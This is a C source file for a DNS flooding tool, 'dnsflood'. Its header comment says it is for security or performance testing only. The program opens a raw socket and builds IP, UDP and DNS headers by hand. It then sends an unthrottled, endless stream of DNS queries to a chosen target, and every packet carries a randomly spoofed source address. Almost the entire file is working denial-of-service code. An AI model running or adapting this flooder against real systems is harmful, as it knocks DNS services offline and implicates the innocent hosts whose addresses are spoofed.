/*
 
usage: dnsflood  <destination_ip> <port> <query_domain> 

.You must use this program for DNS system security or DNS performance test only.

.Any Modify or Reprogram  for discomfort target to anyother  beyond my willing

.evil means no Attach me

lyxmoo@msn.com
*/
#define COUNTMAX 8000
#define FTIME  0
// #include <libnet.h>
#include <pcap.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <unistd.h>
#include <strings.h>
#include <math.h>

#define   MAX_FAKE 100
#define   ERROR    -1
#define   TYPE_A   1
#define   TYPE_PTR 12
#define	  CLASS_INET 1

#ifndef IPVERSION
  #define IPVERSION 4
#endif                  /* IPVERISON */

#ifndef IP_MAXPACKET
  #define IP_MAXPACKET 65535
#endif                  /* IP_MAXPACKET */

#define DNSHDRSIZE 12
struct udphdr {
	u_short source;		/* source port */
	u_short dest;		/* destination port */
	u_short	len;		/* udp length */
	u_short check;		/* udp checksum */
};

#ifndef IPVERSION
  #define IPVERSION 4
#endif                  /* IPVERISON */

struct iphdr {
  u_char  ihl:4,	    /* header length */
          version:4;	/* version */
  u_char  tos;		    /* type of service */
  short   tot_len;	    /* total length */
  u_short id;		    /* identification */
  short   off;		    /* fragment offset field */
#define IP_DF   0x4000	/* dont fragment flag */
#define IP_MF   0x2000	/* more fragments flag */
  u_char  ttl;		    /* time to live */
  u_char  protocol;	    /* protocol */
  u_short check;	    /* checksum */
  struct  in_addr saddr, daddr;  /* source and dest address */
};

#ifndef IP_MAXPACKET
#define IP_MAXPACKET 65535
#endif                   /* IP_MAXPACKET */

#define   IPHDRSIZE     sizeof(struct iphdr)
#define   UDPHDRSIZE    sizeof(struct udphdr)

   
struct dnshdr {
	unsigned short int id;

	unsigned char  rd:1;           /* recursion desired */
	unsigned char  tc:1;           /* truncated message */
	unsigned char  aa:1;           /* authoritive answer */
	unsigned char  opcode:4;       /* purpose of message */
	unsigned char  qr:1;           /* response flag */

	unsigned char  rcode:4;        /* response code */
	unsigned char  unused:2;       /* unused bits */
	unsigned char  pr:1;           /* primary server required (non standard) */
	unsigned char  ra:1;           /* recursion available */

	unsigned short int que_num;
	unsigned short int rep_num;
	unsigned short int num_rr;
	unsigned short int num_rrsup;
};


int udp_send(int s, unsigned long saddr, unsigned long daddr,unsigned short sport,unsigned short dport,char *datagram, unsigned datasize);
unsigned short in_cksum(char *packet, int len);

void nameformatIP(char *ip, char *resu);
void nameformat(char *name, char *QS);

int make_question_packet(char *data, char *name, int type);
int myrand(void);


int main (int argc, char **argv)   {
    struct sockaddr_in src_ip,       /* source address          */
            dst_ip;                  /* destination address     */
    
    u_short src_port,                /* source port             */
            dst_port,      		     /* destination port        */
            id;                      /* dns id we are spoofing  */
    
    int     written_bytes,           /* number of bytes written */
            packet_size,             /* size of our packet      */
            payload_size,            /* size of our payload     */
            roundcount,tmp,jcounter,        /* tmp INT */
            sockid;                  /* socket to write on      */
    
    unsigned long s_ip, d_ip;

    char namefake[16];
	FILE *fp;
    unsigned char packet[1024],*dnsdata;
/*
    static struct option long_options[] = {
                   {"file", 1, 0, 'f'},
                   {"target", 0, 0, 't'},
                   {"port", 1, 0, 'p'},
                   {"version", 0, 0, 'v'},
                   {"rawdata", 1, 0, 'r'},
                   {"static", 1, 0, 's'},
                   {0, 0, 0, 0}
               };
               
  */
    struct dnshdr *dns;
    const int on=1;
    struct timeval start0={0,0};
    struct timeval t0={0,0};
    struct timeval t1={0,0};
    
    if (argc < 3)   {
        printf("\nusage: dnsflood  <destination_ip> <port> <query_A_record>\n");
        printf("--source --target --port --file --version\n");
        exit (EXIT_FAILURE);
    }
    
  if ((sockid = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR)
        { printf("\n%s\n", "network initialization failed\n");exit(1);}
  
  if((setsockopt(sockid, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on))) == ERROR)
	{
		perror("setsockopt");
		exit(ERROR);
	}
	
    inet_pton(AF_INET,argv[1],&dst_ip.sin_addr);
    d_ip=dst_ip.sin_addr.s_addr;
    
    
    dst_port = (u_short) atoi(argv[2]);
    src_port = (u_short) 1337+myrand();
   
	dns  = (struct dnshdr *)packet;
	dnsdata = (char *)(packet+DNSHDRSIZE);
	bzero(packet,1024);

	dns->rd      = 1;		    /* rd = 1: bind 8 checks this	 */
	dns->que_num = htons(1);	/* sending one question (yep)    */

  // fp = fopen(argv[3], "r");
   
   jcounter=0;
   gettimeofday(&t0,NULL);
   start0.tv_sec=t0.tv_sec;
   start0.tv_usec=t0.tv_usec;
   gettimeofday(&t1,NULL);
    
   while(1) {
      jcounter++;
     if ((jcounter-(rint(jcounter/COUNTMAX)*COUNTMAX))==0) 
          {
          gettimeofday(&t1,NULL);
          t0.tv_usec=t1.tv_usec;
          t0.tv_sec=t1.tv_sec;
          usleep(FTIME*10000);
          tmp=t1.tv_sec-start0.tv_sec;
          printf("Once & Once More... %d %d/sec %d\n\n",jcounter,jcounter/(tmp?tmp:1),tmp);}
     // printf("Starting...\n");


    sprintf(namefake,"%d.%d.%d.%d",myrand(),myrand(),myrand(),myrand()); 
    //printf("\t%s\n",namefake);
    
     inet_pton(AF_INET,namefake,&src_ip.sin_addr);
     s_ip=src_ip.sin_addr.s_addr;
    
       	dns->id      = 6000+myrand();	   /* random query id	     */
		dns->qr      = 0;		  	       /* qr = 0: question packet   */
		dns->aa      = 0;		           /* aa = 0: not auth answer   */
		dns->rep_num = htons(0);	       /* sending no replies        */
		
		tmp=make_question_packet(dnsdata,argv[3],TYPE_A);
       
		udp_send(sockid,s_ip,d_ip,1337+myrand(),53,packet,DNSHDRSIZE+tmp);
		
		    
    }
     
     exit(0);
}


 unsigned short in_cksum(char *packet, int len)
{
	register int nleft = len;
	register u_short *w = (u_short *)packet;
	register int sum = 0;
	u_short answer = 0;

	/*
	* Our algorithm is simple, using a 32 bit accumulator (sum), we add
	* sequential 16 bit words to it, and at the end, fold back all the
	* carry bits from the top 16 bits into the lower 16 bits.
	*/
	while (nleft > 1)  
	{
		sum += *w++;
		nleft -= 2;
	}

	/* mop up an odd byte, if necessary */
	
	if (nleft == 1)
	{
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	/* add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
	sum += (sum >> 16);                 /* add carry */
	answer = ~sum;                      /* truncate to 16 bits */
	return(answer);
}

int udp_send(int s, unsigned long saddr, unsigned long daddr,unsigned short sport,unsigned short dport,char *datagram, unsigned datasize) 
{
	struct sockaddr_in sin;
	struct   iphdr   *ip;
	struct   udphdr  *udp;
	unsigned char    *data;
	unsigned char    packet[4024];

    int itmp;

	ip     = (struct iphdr     *)packet; 
	udp    = (struct udphdr    *)(packet+IPHDRSIZE);
	data   = (unsigned char    *)(packet+IPHDRSIZE+UDPHDRSIZE);
	       
	memset(packet,0,sizeof(packet));

	udp->source  = htons(sport); 
	udp->dest    = htons(dport);
	udp->len     = htons(UDPHDRSIZE+datasize);
	udp->check   = 0;         

	memcpy(data,datagram,datasize);
	
	ip->saddr.s_addr  = saddr;
	ip->daddr.s_addr  = daddr;
	ip->version  = 4;             /*ip version*/
	ip->ihl      = 5;
	ip->ttl      = 245;
	ip->id       = random()%5985;
	ip->protocol = IPPROTO_UDP;   /*protocol type*/
	ip->tot_len  = htons(IPHDRSIZE + UDPHDRSIZE + datasize);
	ip->check    = 0;
	ip->check    = in_cksum((char *)packet,IPHDRSIZE);

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr=daddr;
	sin.sin_port=udp->dest;
	
	/* scratch IP package for debug
	printf ("src_port=%x,dst_port=%x,tot_len=%x, datasize =%d\n",sport,dport,ip->tot_len,datasize);
	for (itmp=0; itmp< IPHDRSIZE+UDPHDRSIZE;itmp++) printf("%2x ",packet[itmp]);
    for (itmp; itmp< IPHDRSIZE+UDPHDRSIZE+datasize;itmp++) printf("%2c ",packet[itmp]);
    printf("|||\n");
    */

	return(sendto(s, packet, IPHDRSIZE+UDPHDRSIZE+datasize, 0, (struct sockaddr*)&sin, sizeof(struct sockaddr)));
}

void nameformat(char *name, char *QS)
{
        char *bungle,*x;
        char elem[128];

    	*QS = 0;
        bungle=malloc(strlen(name)+3);
        strcpy(bungle,name);
        x=strtok(bungle,".");
        while (x != NULL)
        {
                if (snprintf(elem,128,"%c%s",strlen(x),x) == 128)
                {
                        puts("String overflow.");
                        exit(1);
                }
                strcat(QS,elem);
                x=strtok(NULL,".");
        }
	free(bungle);
}

void nameformatIP(char *ip, char *resu)
{
	char *reverse, *temp, *x, *comps[10];
	int px=0;

	temp=malloc(strlen(ip)+3);
	reverse=malloc(strlen(ip)+30);
	bzero(reverse,strlen(ip)+30);
	strcpy(temp,ip);
	x=strtok(temp,".");
	while (x != NULL)
	{
		if (px >= 10)
		{
			puts("Force DUMP:: dumbass, wtf you think this is, IPV6?");
			exit(1);
		}
		comps[px++]=x;
		x=strtok(NULL,".");
	}
	for (px-- ;px >= 0; px--)
	{
		strcat(reverse,comps[px]);
		strcat(reverse,".");
	}
	strcat(reverse,"in-addr.arpa");
	nameformat(reverse,resu);
	free(temp);
	free(reverse);
}

int make_question_packet(char *data, char *name, int type)
{
	if(type == TYPE_A )
	{
		nameformat(name,data);
		*( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_A);
	}
/* for other type querry
	if(type == TYPE_PTR){
		nameformatIP(name,data);
  	*( (u_short *) (data+strlen(data)+1) ) = htons(TYPE_PTR);
	}
       
*/	

*( (u_short *) (data+strlen(data)+3) ) = htons(CLASS_INET); 
 
 
	return(strlen(data)+5);   
}

int myrand(void)
{
	int j; 
	j=1+(int) (150.0*rand()/(RAND_MAX+1.0));
	return(j);
}



